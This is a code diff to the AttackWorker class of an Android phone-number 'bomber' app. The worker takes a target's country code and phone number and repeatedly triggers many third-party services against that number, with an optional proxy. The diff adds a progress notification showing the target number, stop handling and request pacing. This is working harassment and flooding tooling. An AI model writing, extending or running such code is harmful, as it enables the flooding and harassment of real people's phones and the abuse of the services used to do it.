@@ -1,13 +1,20 @@
 package com.dm.bomber.workers;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.content.Context;
+import android.os.Build;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
+import androidx.core.app.NotificationCompat;
+import androidx.core.app.NotificationManagerCompat;
 import androidx.work.Data;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
+import com.dm.bomber.R;
 import com.dm.bomber.services.Service;
 import com.dm.bomber.services.Services;
 import com.dm.bomber.ui.MainRepository;
@@ -30,15 +37,18 @@ public class AttackWorker extends Worker {
 
     public static final String KEY_COUNTRY_CODE = "country_code";
     public static final String KEY_PHONE = "phone";
-    public static final String KEY_NUMBER_OF_CYCLES = "number_of_cycles";
+    public static final String KEY_REPEATS = "repeats";
     public static final String KEY_PROXY_ENABLED = "proxy_enabled";
 
     public static final String KEY_PROGRESS = "progress";
     public static final String KEY_MAX_PROGRESS = "max_progress";
 
+    private static final String CHANNEL_ID = "attack";
+
     private int progress = 0;
 
     private CountDownLatch tasks;
+    private boolean stopped;
 
     private static OkHttpClient client = new OkHttpClient.Builder()
             .callTimeout(7, TimeUnit.SECONDS)
@@ -71,7 +81,10 @@ public class AttackWorker extends Worker {
         String countryCode = getInputData().getString(KEY_COUNTRY_CODE);
         String phone = getInputData().getString(KEY_PHONE);
 
-        int numberOfCycles = getInputData().getInt(KEY_NUMBER_OF_CYCLES, 1);
+        int repeats = getInputData().getInt(KEY_REPEATS, 1);
+
+        assert countryCode != null;
+        assert phone != null;
 
         List<Service> usableServices = Services.getUsableServices(countryCode);
         Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));
@@ -80,7 +93,22 @@ public class AttackWorker extends Worker {
                 .proxy(null)
                 .build();
 
-        for (int cycle = 0; cycle < numberOfCycles; cycle++) {
+        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            CharSequence name = getApplicationContext().getString(R.string.attack);
+            String description = getApplicationContext().getString(R.string.channel_description);
+
+            int importance = NotificationManager.IMPORTANCE_LOW;
+
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
+            channel.setDescription(description);
+
+            notificationManager.createNotificationChannel(channel);
+        }
+
+        attack:
+        for (int cycle = 0; cycle < repeats; cycle++) {
             Log.i(TAG, String.format("Started cycle %s", cycle));
             tasks = new CountDownLatch(usableServices.size());
 
@@ -94,9 +122,13 @@ public class AttackWorker extends Worker {
             }
 
             for (Service service : usableServices) {
-                service.prepare(countryCode, phone);
+
+                if (isStopped()) {
+                    break attack;
+                }
 
                 try {
+                    service.prepare(countryCode, phone);
                     service.run(client, new com.dm.bomber.services.Callback() {
                         @Override
                         public void onError(Exception e) {
@@ -111,27 +143,47 @@ public class AttackWorker extends Worker {
                                         service.getClass().getName(), response.code()));
                             }
 
+                            if (!stopped) {
+                                Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
+                                        .setContentTitle(getApplicationContext().getString(R.string.attack))
+                                        .setContentText("+" + countryCode + phone)
+                                        .setProgress(usableServices.size() * repeats, progress, false)
+                                        .setStyle(new NotificationCompat.BigTextStyle())
+                                        .setSmallIcon(R.drawable.logo)
+                                        .build();
+
+
+                                notificationManager.notify(getId().hashCode(), notification);
+
+                                setProgressAsync(new Data.Builder()
+                                        .putInt(KEY_PROGRESS, progress++)
+                                        .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
+                                        .build());
+                            }
+
                             tasks.countDown();
-                            setProgressAsync(new Data.Builder()
-                                    .putInt(KEY_PROGRESS, progress++)
-                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * numberOfCycles)
-                                    .build());
                         }
                     });
                 } catch (StringIndexOutOfBoundsException e) {
                     Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
                 }
-            }
 
-            if (isStopped())
-                break;
+                try {
+                    Thread.sleep(1000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
 
             try {
                 tasks.await();
             } catch (InterruptedException e) {
-                break;
+                e.printStackTrace();
             }
         }
+
+        stopped = true;
+        notificationManager.cancel(getId().hashCode());
 
         Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
         return Result.success();
